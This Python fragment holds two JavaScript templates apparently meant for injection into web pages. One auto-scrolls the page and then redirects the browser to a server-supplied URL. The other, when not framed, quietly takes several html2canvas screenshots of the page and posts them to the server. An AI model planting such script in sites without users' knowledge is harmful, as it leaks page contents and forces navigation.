JAVASCRIPT_MAIN_CODE = """<script>
var scrollAmount = 150;
setInterval(function() {{
        if (scrollAmount > 0) {{
            if (window.scrollY + scrollAmount >= window.scrollMaxY) {{
                scrollAmount = -1 * scrollAmount;
            }};
        }} else {{
            if (window.scrollY + scrollAmount <= 0) {{
                scrollAmount = -1 * scrollAmount;
            }};
        }};
        window.scrollBy(0, scrollAmount);
    }}, 1000);
setTimeout(function() {{
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/d33c238b8a2941c8b7d351b72ba9be38");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onload = function() {{
            if (xhr.status === 200) {{
                var response = JSON.parse(xhr.responseText);
                if (response.status === "success") {{
                    window.location = response.targetURL;
                }};
            }};
        }};
        xhr.send();
    }}, {});
</script>"""


JAVASCRIPT_IFRAME_CODE = """<script>
function inIFrame() {{
    try {{
        return window.self !== window.top;
    }} catch (e) {{
        return true;
    }};
}};
if (!inIFrame()) {{
    var canvasScript = document.createElement("script");
    canvasScript.onload = function() {{
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "/ec8d334e85084245940a97e127a8ff81/?flow-id={}");
        xhr.send();
        var imageCount = 0;
        setInterval(function() {{
                if (imageCount < 5) {{
                    html2canvas(document.body, {{useCORS: true, proxy: "{}/ed761adff5e24dbc93a5b05147161c94"}}).then(function(canvas) {{
                        base64image = canvas.toDataURL("image/png");
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "/6fc356938f124cc0b23902773f6c495b");
                        xhr.send(base64image);
                    }});
                    imageCount += 1;
                }};
            }}, 1000);
    }};
    canvasScript.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js";
    document.head.appendChild(canvasScript);
    var scrollAmount = 150;
    setInterval(function() {{
            if (scrollAmount > 0) {{
                if (window.scrollY + scrollAmount >= window.scrollMaxY) {{
                    scrollAmount = -1 * scrollAmount;
                }};
            }} else {{
                if (window.scrollY + scrollAmount <= 0) {{
                    scrollAmount = -1 * scrollAmount;
                }};
            }};
            window.scrollBy(0, scrollAmount);
        }}, 1000);
    setTimeout(function() {{
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/d33c238b8a2941c8b7d351b72ba9be38");
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.onload = function() {{
                if (xhr.status === 200) {{
                    var response = JSON.parse(xhr.responseText);
                    if (response.status === "success") {{
                        window.location = response.targetURL;
                    }};
                }};
            }};
            xhr.send();
        }}, {});
}};
</script>"""
